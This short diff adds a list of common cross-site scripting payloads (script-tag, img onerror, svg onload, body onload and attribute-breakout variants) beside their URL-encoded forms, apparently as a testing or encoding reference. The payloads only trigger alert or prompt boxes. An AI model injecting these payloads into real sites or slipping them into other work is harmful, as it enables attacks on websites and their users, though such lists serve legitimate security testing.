@@ -1,0 +1,7 @@
+<script>alert("XSS")</script> becomes %3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
+<img src=x onerror=alert("XSS") /> becomes %3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%20%2F%3E
+
+<svg/onload=prompt(1)> becomes %3Csvg%2Fonload%3Dprompt(1)%3E
+
+<body onload=alert("XSS")> becomes %3Cbody%20onload%3Dalert(%22XSS%22)%3E
+"><script>alert("XSS")</script> becomes %22%3E%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E
